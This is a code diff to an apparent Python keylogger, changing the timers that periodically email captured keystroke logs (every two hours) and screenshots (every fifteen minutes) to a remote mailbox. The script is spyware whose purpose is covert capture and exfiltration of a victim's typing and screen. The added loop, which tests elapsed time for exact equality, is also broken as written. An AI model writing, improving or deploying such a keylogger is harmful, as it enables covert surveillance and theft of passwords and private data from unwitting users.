@@ -6,7 +6,7 @@ from email import encoders
 import smtplib
 from threading import Timer
 import time
-
+from resettabletimer import ResettableTimer
 from os import access
 import mailslurp_client
 from requests import options
@@ -236,8 +236,18 @@ def send_img():
     os.remove(file_path+ '\\keylogger'+'\\screenshot.png') #deletes png file
 
 
+
 #defining time interval for sending the data
-tlog = Timer(7200.0, send_log) #7200sec, 2hr
-timg= Timer(900,send_img) #900 seconds,ie 15 mins, can be changed 
+tlog = ResettableTimer(7200.0, send_log) #7200sec, 2hr
+timg= ResettableTimer(900,send_img) #900 seconds,ie 15 mins, can be changed 
+
 tlog.start()
 timg.start()
+start_time=time.time()
+while True:
+    if time.time()-start_time==900:
+        timg.reset()
+        timg.start()
+    if time.time()-start_time==7200:
+        tlog.reset()
+        tlog.start()
